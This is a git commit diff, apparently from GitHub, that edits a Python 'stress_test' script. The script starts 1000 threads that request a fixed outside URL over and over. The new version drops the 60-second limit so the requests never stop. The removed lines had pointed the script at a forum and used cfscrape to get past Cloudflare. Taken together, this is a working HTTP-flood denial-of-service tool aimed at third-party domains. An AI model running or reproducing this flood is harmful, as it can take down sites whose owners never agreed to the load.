099c1cb7d04dff52d03b85cd3fd8cd0cee905309
Biasstudents <139652035+Biasstudents@users.noreply.github.com>
2023-07-18 01:47:45 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,21 +1,17 @@
-import cfscrape
+import requests
 import threading
-import datetime
 
-url = 'https://forum.ventox.lol'
+url = 'https://tls.mrrage.xyz/nginx_status'
 num_threads = 1000
-test_duration = 60 # in seconds
 
-def stress_test(until):
-    scraper = cfscrape.create_scraper()
-    while (until - datetime.datetime.now()).total_seconds() > 0:
-        response = scraper.get(url)
+def stress_test():
+    while True:
+        response = requests.get(url)
         print(response.status_code)
 
-until = datetime.datetime.now() + datetime.timedelta(seconds=test_duration)
 threads = []
 for i in range(num_threads):
-    t = threading.Thread(target=stress_test, args=(until,))
+    t = threading.Thread(target=stress_test)
     t.start()
     threads.append(t)
 
